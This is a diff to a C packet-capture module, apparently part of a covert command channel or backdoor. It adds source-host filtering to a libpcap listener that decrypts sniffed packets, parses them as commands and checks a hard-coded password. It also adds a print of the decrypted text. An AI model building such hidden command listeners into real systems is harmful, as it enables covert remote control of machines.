@@ -1,6 +1,6 @@
 #include "pktcap.h"
 
-int startPacketCapture(pcap_t * nic_descr, struct bpf_program fp, int port){
+int startPacketCapture(pcap_t * nic_descr, struct bpf_program fp, int dst, char * src_host, int port){
 	
 	char nic_dev[BUFFER];		// NIC device name to monitor
 	pcap_if_t *alldevs, *temp; 	// NIC list variables
@@ -41,7 +41,11 @@ int startPacketCapture(pcap_t * nic_descr, struct bpf_program fp, int port){
 	}
 
 	/* Compiling the filter expression */
-	sprintf(filter_exp, "tcp and dst port %d", port);
+	if(dst == FROM_CLIENT)
+		sprintf(filter_exp, "tcp and dst port %d", port);
+	if(dst == FROM_SERVER)	
+		sprintf(filter_exp, "tcp and src host %s", src_host);	
+	
 	if(pcap_compile(nic_descr, &fp, filter_exp, 0, netp))
 	{
 		fprintf(stderr, "Cannot parse expression filter\n");
@@ -122,6 +126,7 @@ void pkt_callback(u_char *ptr_null, const struct pcap_pkthdr* pkt_header, const 
 		fprintf(stderr, "scanning error\n");
 		return;
 	}
+	printf("Decrypted Packet: %s\n", decrypted);
 	command = parse_cmd(decrypted);
 
 	if(mode == SERVER_MODE && (strcmp(password, PASSWORD) == 0))
